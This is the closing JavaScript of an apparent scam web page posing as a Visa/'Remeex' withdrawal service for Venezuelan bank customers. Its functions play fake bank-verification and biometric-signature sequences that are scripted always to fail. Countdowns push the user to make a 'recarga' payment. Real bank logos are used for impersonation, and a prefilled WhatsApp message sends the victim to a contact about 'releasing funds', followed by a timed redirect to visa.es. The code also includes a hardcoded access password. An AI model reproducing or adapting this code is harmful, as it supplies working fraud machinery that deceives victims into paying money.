    const btn = document.getElementById("continueSecurityBtn2");
    const cdLabel = document.getElementById("countdownSecurity2");
    let timer = securityVerification2Countdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Disponible en ${timer} segundos...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }
  function startSecurity3ACountdown() {
    const btn = document.getElementById("continueSecurity3ABtn");
    const cdLabel = document.getElementById("countdownSecurity3A");
    let timer = security3ACountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }
  function startSecurity3BCountdown() {
    const btn = document.getElementById("continueSecurity3BBtn");
    const cdLabel = document.getElementById("countdownSecurity3B");
    let timer = security3BCountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Disponible en ${timer} segundos...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }
  function startRecargaReadyCountdown() {
    const btn = document.getElementById("recargaReadyBtn");
    const cdLabel = document.getElementById("countdownRecargaReady");
    let timer = recargaReadyBtnCountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        recargaReadyBtnEnabled = true;
        btn.disabled = false;
        cdLabel.textContent = "¿Ya realizaste la recarga? Haz clic en continuar";
      }
    }, 1000);
  }
  function startConfirmRecargaCountdown() {
    const btn = document.getElementById("confirmRecargaBtn");
    const cdLabel = document.getElementById("countdownRecargaConfirm");
    let timer = confirmRecargaBtnCountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Verificando datos. Disponible en ${timer} segundos...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Verificando datos. Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes confirmar ahora";
      }
    }, 1000);
  }

  /****************************************************
   * Secuencia de firma
   ****************************************************/
  let secuenciaFirmaInterval = null;
  function startSecuenciaFirma() {
    firmaSecuenciaStep = 0;
    if (secuenciaFirmaInterval) clearInterval(secuenciaFirmaInterval);

    showOverlay("overlaySecuenciaFirma");
    const titulo = document.getElementById("secuenciaFirmaTitulo");
    const texto = document.getElementById("secuenciaFirmaTexto");
    const progressBar = document.getElementById("secuenciaFirmaProgress");
    const percentDisplay = document.querySelector("#overlaySecuenciaFirma .progress-percentage");

    // Reproducir audio
    playAudio();

    const secuenciaTextos = [
      { titulo: "Iniciando análisis de firma", texto: "Estableciendo conexión con el sistema de verificación...", progreso: 12 },
      { titulo: "Conectando con el banco...", texto: "Estableciendo canal seguro con " + (bancoUsuario || "tu banco"), progreso: 25 },
      { titulo: "Procesando firma digital", texto: "Analizando trazos y características de tu firma...", progreso: 38 },
      { titulo: "Consultando registros bancarios", texto: "Comparando con la firma registrada en " + (bancoUsuario || "tu banco"), progreso: 50 },
      { titulo: "Análisis biométrico en curso", texto: "Verificando puntos de coincidencia y patrones de escritura...", progreso: 62 },
      { titulo: "Realizando verificación avanzada", texto: "Ejecutando algoritmos de reconocimiento...", progreso: 75 },
      { titulo: "Firma no coincide", texto: "Se han detectado discrepancias entre tu firma y la registrada.", progreso: 88, error: true },
      { titulo: "Verificación adicional requerida", texto: "Por seguridad, necesitaremos un proceso adicional.", progreso: 100, error: true }
    ];

    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    
    // Iniciar animación de la barra de progreso
    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);

    secuenciaFirmaInterval = setInterval(() => {
      firmaSecuenciaStep++;
      if (firmaSecuenciaStep < secuenciaTextos.length) {
        const step = secuenciaTextos[firmaSecuenciaStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        
        const currentWidth = parseInt(progressBar.style.width) || 0;
        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
        
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        clearInterval(secuenciaFirmaInterval);
        hideOverlay("overlaySecuenciaFirma");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");
        hideVisaCard("signatureVerification");
        showVisaCard("securityVerification1");
        startSecurity1Countdown();
      }
    }, 15000);
  }

  /****************************************************
   * Verificando recarga (ACTUALIZADA)
   ****************************************************/
  let verificandoRecargaInterval = null;
  function startVerificandoRecarga() {
    recargaSecuenciaStep = 0;
    if (verificandoRecargaInterval) clearInterval(verificandoRecargaInterval);

    showOverlay("overlayVerificandoRecarga");
    const titulo = document.getElementById("verificandoRecargaTitulo");
    const texto = document.getElementById("verificandoRecargaTexto");
    const progressBar = document.getElementById("verificandoRecargaProgress");
    const percentDisplay = document.querySelector("#overlayVerificandoRecarga .progress-percentage");

    const { montoRecargaBs } = calcularMontoRecarga();
    const montoFormateado = formatNumberVE(montoRecargaBs);

    const secuenciaTextos = [
      { titulo: "Iniciando verificación...", texto: `Buscando tu recarga de ${montoFormateado} Bs`, progreso: 12 },
      { titulo: "Consultando movimientos recientes", texto: "Analizando operaciones recientes...", progreso: 24 },
      { titulo: "Verificando pago móvil", texto: `Buscando recarga de ${montoFormateado} Bs...`, progreso: 36 },
      { titulo: "Comprobando titularidad", texto: "Validando datos bancarios registrados...", progreso: 48 },
      { titulo: "Consultando banco emisor", texto: "Verificando detalles de la operación...", progreso: 60 },
      { titulo: "Verificación adicional", texto: "Examinando información complementaria...", progreso: 72 },
      { titulo: `No encontramos tu recarga de ${montoFormateado} Bs`, texto: "No se detectan movimientos con el monto exacto.", progreso: 84, error: true },
      { titulo: "Verificación manual requerida", texto: "Completa la info de tu recarga manualmente.", progreso: 100, error: true }
    ];

    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    
    // Iniciar animación de la barra de progreso
    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);

    verificandoRecargaInterval = setInterval(() => {
      recargaSecuenciaStep++;
      if (recargaSecuenciaStep < secuenciaTextos.length) {
        const step = secuenciaTextos[recargaSecuenciaStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        
        const currentWidth = parseInt(progressBar.style.width) || 0;
        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
        
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        clearInterval(verificandoRecargaInterval);
        hideOverlay("overlayVerificandoRecarga");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");
        // Mostrar pantalla "recargaSection"
        showVisaCard("recargaSection");
        startConfirmRecargaCountdown();
      }
    }, 15000);
  }

  /****************************************************
   * Secuencia final (ACTUALIZADA)
   ****************************************************/
  let secuenciaFinalInterval = null;
  function startSecuenciaFinal() {
    secuenciaFinalStep = 0;
    if (secuenciaFinalInterval) clearInterval(secuenciaFinalInterval);

    showOverlay("overlaySecuenciaFinal");
    const titulo = document.getElementById("secFinalTitulo");
    const texto = document.getElementById("secFinalTexto");
    const progressBar = document.getElementById("secuenciaFinalProgress");
    const percentDisplay = document.querySelector("#overlaySecuenciaFinal .progress-percentage");

    const { montoRecargaBs } = calcularMontoRecarga();
    const montoFormateado = formatNumberVE(montoRecargaBs);

    const secuenciaTextos = [
      { titulo: "Procesando información", texto: "Verificando comprobante de recarga...", progreso: 12 },
      { titulo: `Buscando recarga de ${montoFormateado} Bs`, texto: "Consultando últimos movimientos...", progreso: 24 },
      { titulo: "Validando datos de tu cuenta", texto: `Verificando cuenta ${numeroCuenta} en ${bancoUsuario}`, progreso: 36 },
      { titulo: "Preparando tu depósito", texto: "Confirmando transacción de fondos...", progreso: 48 },
      { titulo: "Analizando información adicional", texto: "Validando datos de seguridad...", progreso: 60 },
      { titulo: "Verificación de comprobante", texto: "Procesando información del comprobante...", progreso: 72 },
      { titulo: "Recarga no encontrada", texto: `No encontramos el movimiento de ${montoFormateado} Bs.`, progreso: 84, error: true },
      { titulo: "Verificación adicional requerida", texto: "Necesitamos validación adicional.", progreso: 100, error: true }
    ];

    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    
    // Iniciar animación de la barra de progreso
    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);

    secuenciaFinalInterval = setInterval(() => {
      secuenciaFinalStep++;
      if (secuenciaFinalStep < secuenciaTextos.length) {
        const step = secuenciaTextos[secuenciaFinalStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        
        const currentWidth = parseInt(progressBar.style.width) || 0;
        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
        
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        clearInterval(secuenciaFinalInterval);
        hideOverlay("overlaySecuenciaFinal");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");

        showOverlay("overlayErrorFinal");
        configurarWhatsAppLink();
      }
    }, 15000);
  }

  // Configura link WhatsApp (ACTUALIZADA)
  function configurarWhatsAppLink() {
    const whatsappLink = document.getElementById("whatsappLink");
    if (!whatsappLink) return;

    const { montoRecargaBs } = calcularMontoRecarga();
    const montoFormateado = formatNumberVE(montoRecargaBs);

    const msg = encodeURIComponent(
      `Hola, soy ${nombreCompleto || "cliente"}, con documento ${documentoBeneficiario || "pendiente"}. ` +
      `No se encontró mi recarga de verificación por ${montoFormateado} Bs y necesito ` +
      `ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario || "mi banco"}.`
    );
    whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;

    whatsappLink.addEventListener("click", function(){
      setTimeout(function(){
        window.location.href = "https://visa.es";
      }, 120000);
    });
  }

  /****************************************************
   * Overlays
   ****************************************************/
  function showOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) {
      overlay.classList.add("active");
      
      // Para contador regresivo si es el overlay de firma no coincide
      if (id === 'overlayFirmaNoCoincide') {
        startCountdown();
      }
    }
  }
  
  function hideOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) {
      overlay.classList.remove("active");
      if (id === "overlayFirmaNoCoincide" && redirectCountdownInterval) {
        clearInterval(redirectCountdownInterval);
        redirectCountdownInterval = null;
      }
    }
  }
  
  // Contador regresivo para el overlay FirmaNoCoincide
  function startCountdown() {
    const countdownElement = document.getElementById('redirectCountdown');
    const progressBar = document.getElementById('redirectProgressBar');
    const percentDisplay = document.querySelector('#overlayFirmaNoCoincide .progress-percentage');
    
    if (!countdownElement || !progressBar) return;
    
    let timeLeft = 10;
    countdownElement.textContent = timeLeft;
    
    // Iniciar animación de la barra de progreso
    animateProgressBar(progressBar, 0, 10, 500, percentDisplay);
    
    redirectCountdownInterval = setInterval(() => {
      timeLeft--;
      countdownElement.textContent = timeLeft;
      
      const percent = 100 - (timeLeft * 10);
      animateProgressBar(progressBar, progressBar.style.width.replace('%', ''), percent, 500, percentDisplay);
      
      if (timeLeft <= 0) {
        clearInterval(redirectCountdownInterval);
        setTimeout(() => {
          hideOverlay('overlayFirmaNoCoincide');
        }, 500);
      }
    }, 1000);
  }

  /****************************************************
   * UTILIDADES
   ****************************************************/
  function formatNumberVE(num) {
    return Number(num).toLocaleString("es-VE", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });
  }

  function copyToClipboard(elementId) {
    let text;
    if (elementId === 'verificacionNumero' || elementId === 'verificacionRif' || elementId === 'verificacionMonto' || elementId === 'conceptoRecarga') {
      text = document.getElementById(elementId).textContent;
    } else if (elementId === 'verificacionNumeroModal' || elementId === 'verificacionRifModal' || elementId === 'verificacionMontoModal' || elementId === 'conceptoRecargaModal') {
      text = document.getElementById(elementId).textContent;
    } else if (typeof elementId === 'string' && !document.getElementById(elementId)) {
      text = elementId;
    } else {
      const el = document.getElementById(elementId);
      if (el) text = el.textContent;
    }
    if (!text) return;

    if (navigator.clipboard) {
      navigator.clipboard.writeText(text)
        .then(() => {
          showCopyNotification();
        })
        .catch(err => {
          fallbackCopy(text);
        });
    } else {
      fallbackCopy(text);
    }
  }
  function fallbackCopy(text) {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.style.position = "fixed";
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    try {
      const successful = document.execCommand('copy');
      if (successful) {
        showCopyNotification();
      } else {
        alert("No se pudo copiar el texto");
      }
    } catch (err) {
      alert("Error al copiar: " + err);
    }
    document.body.removeChild(textarea);
  }
  function showCopyNotification() {
    const notification = document.createElement("div");
    notification.textContent = "Copiado al portapapeles";
    notification.style.position = "fixed";
    notification.style.bottom = "20px";
    notification.style.left = "50%";
    notification.style.transform = "translateX(-50%)";
    notification.style.padding = "10px 16px";
    notification.style.background = "#1a1f71";
    notification.style.color = "white";
    notification.style.borderRadius = "8px";
    notification.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
    notification.style.zIndex = "2000";
    notification.style.opacity = "0";
    notification.style.transition = "opacity 0.3s ease-in-out";

    document.body.appendChild(notification);
    setTimeout(() => { notification.style.opacity = "1"; }, 10);
    setTimeout(() => {
      notification.style.opacity = "0";
      setTimeout(() => {
        document.body.removeChild(notification);
      }, 300);
    }, 2000);
  }

  // Mapeo bancos -> logo
  const bankLogosMapping = {
    "Banco de Venezuela, SA": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
    "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
    "Banco Venezolano de Crédito, SA": "https://www.venezolano.com/images/galeria/108_1.png",
    "Banco Mercantil, CA": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
    "Banco Provincial, SA": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
    "Banco del Caribe CA, Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
    "Banco Exterior CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
    "Banco Caroní CA, Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
    "Banesco Banco Universal, CA": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
    "Banco Sofitasa Banco Universal, CA": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
    "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
    "Banco Fondo Común, CA": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
    "100% Banco, Banco Comercial, CA": "https://www.100x100banco.com/img/logo.png",
    "Banco del Tesoro CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
    "Bancrecer SA, Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
    "Banco Activo CA, Banco Universal": "https://www.bancoactivo.com/logo.svg",
    "Bancamiga Banco Universal, CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
    "Banplus Banco Universal, CA": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
    "Banco Bicentenario del Pueblo, Banco Universal CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
    "Banco Nacional de Crédito CA, Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
  };
  function normalizeBankName(name) {
    return name.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
  }
  const normalizedBankLogosMapping = {};
  Object.keys(bankLogosMapping).forEach(key => {
    normalizedBankLogosMapping[normalizeBankName(key)] = bankLogosMapping[key];
  });
  function getBankLogoURL(bankName) {
    const defaultLogo = "https://via.placeholder.com/100x50?text=Logo";
    if (!bankName) return defaultLogo;
    const normalizedInput = normalizeBankName(bankName);

    if (normalizedBankLogosMapping[normalizedInput]) {
      return normalizedBankLogosMapping[normalizedInput];
    }
    for (let key in normalizedBankLogosMapping) {
      if (normalizedInput.includes(key) || key.includes(normalizedInput)) {
        return normalizedBankLogosMapping[key];
      }
    }
    return defaultLogo;
  }

  /****************************************************
   * NUEVA FUNCIÓN: Agregar protección de contraseña
   ****************************************************/
  function addPasswordProtection() {
    // Definir página actual y su referente permitido
    const currentPage = 'retiroremeex.html';
    const allowedReferrer = 'remeexvisa.html';
    
    // Obtener referrer (página de origen)
    const referrer = document.referrer;
    const referrerPage = referrer ? referrer.split('/').pop() : '';
    
    // Verificar si existe un token de sesión válido
    const hasValidToken = sessionStorage.getItem('accessToken_' + currentPage) === 'authorized';
    
    // Comprobar si el referrer es válido
    const hasValidReferrer = referrerPage === allowedReferrer;
    
    // Si no tiene un token válido y no viene de un referrer permitido, mostrar modal de contraseña
    if (!hasValidToken && !hasValidReferrer) {
        // Ocultar el contenido de la página
        document.documentElement.style.display = 'none';
        
        // Crear un modal de contraseña cuando la página termine de cargar
        window.onload = function() {
            // Restaurar visibilidad solo del modal
            document.documentElement.style.display = '';
            
            // Ocultar el contenido principal
            const mainContainer = document.querySelector('.container');
            if (mainContainer) mainContainer.style.display = 'none';
            
            // Crear el modal de contraseña
            const passwordModal = document.createElement('div');
            passwordModal.style.position = 'fixed';
            passwordModal.style.top = '0';
            passwordModal.style.left = '0';
            passwordModal.style.width = '100%';
            passwordModal.style.height = '100%';
            passwordModal.style.display = 'flex';
            passwordModal.style.alignItems = 'center';
            passwordModal.style.justifyContent = 'center';
            passwordModal.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
            passwordModal.style.zIndex = '9999';
            
            // Contenido del modal
            passwordModal.innerHTML = `
                <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; max-width: 400px; width: 90%;">
                    <h2 style="color: #1a1f71; margin-bottom: 20px;">Acceso Restringido</h2>
                    <p style="margin-bottom: 20px;">Esta página solo es accesible desde ${allowedReferrer}. Por favor, ingrese la contraseña para continuar.</p>
                    <input type="password" id="passwordInput" style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">
                    <div>
                        <button id="submitBtn" style="background-color: #1a1f71; color: white; border: none; padding: 10px 20px; margin-right: 10px; border-radius: 4px; cursor: pointer;">Acceder</button>
                        <button id="cancelBtn" style="background-color: #ccc; color: black; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">Cancelar</button>
                    </div>
                    <p id="errorMsg" style="color: red; margin-top: 15px; display: none;">Contraseña incorrecta. Inténtelo de nuevo.</p>
                </div>
            `;
            
            document.body.appendChild(passwordModal);
            
            // Enfocar el campo de contraseña
            document.getElementById('passwordInput').focus();
            
            // Manejar evento de tecla Enter
            document.getElementById('passwordInput').addEventListener('keyup', function(event) {
                if (event.key === 'Enter') {
                    verifyPassword();
                }
            });
            
            // Botón Acceder
            document.getElementById('submitBtn').addEventListener('click', verifyPassword);
            
            // Botón Cancelar
            document.getElementById('cancelBtn').addEventListener('click', function() {
                // Redirigir a la página inicial
                window.location.href = 'index_remeex.html';
            });
            
            function verifyPassword() {
                const password = document.getElementById('passwordInput').value;
                // Contraseña maestra (cámbiala por la que prefieras)
                const masterPassword = 'remeex2024';
                
                if (password === masterPassword) {
                    // Almacenar token de acceso en sesión
                    sessionStorage.setItem('accessToken_' + currentPage, 'authorized');
                    
                    // Eliminar modal y mostrar contenido
                    document.body.removeChild(passwordModal);
                    if (mainContainer) mainContainer.style.display = 'block';
                } else {
                    // Mostrar mensaje de error
                    document.getElementById('errorMsg').style.display = 'block';
                }
            }
        };
    }
  }

  /****************************************************
   * Script Tawk.to para soporte en vivo
   ****************************************************/
  var Tawk_API = Tawk_API || {},
      Tawk_LoadStart = new Date();
  (function () {
    var s1 = document.createElement("script"),
        s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    s1.src = "https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj";
    s1.charset = "UTF-8";
    s1.setAttribute("crossorigin", "*");
    s0.parentNode.insertBefore(s1, s0);
  })();
</script>
</body>
</html>